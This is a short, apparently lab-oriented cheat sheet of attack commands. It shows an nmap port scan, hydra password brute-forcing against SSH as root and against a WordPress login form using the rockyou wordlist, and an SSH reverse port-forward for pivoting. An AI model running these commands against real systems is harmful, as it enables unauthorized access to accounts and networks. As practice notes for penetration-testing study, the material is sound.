
## Port Scanning
```bash
sudo nmap 10.10.10.10 -sS -sU --min-rate 1000 -oA demo-openports-initial
```

## Password Guessing
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt 10.10.10.10 -t4 ssh

hydra -l root -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form "/blog/wp-login.php?:log=^USER^&pwd=^PASS^:Error"
```

## Pivoting
```bash
ssh -R 8080:localhost:8080 victor@home.edu
```
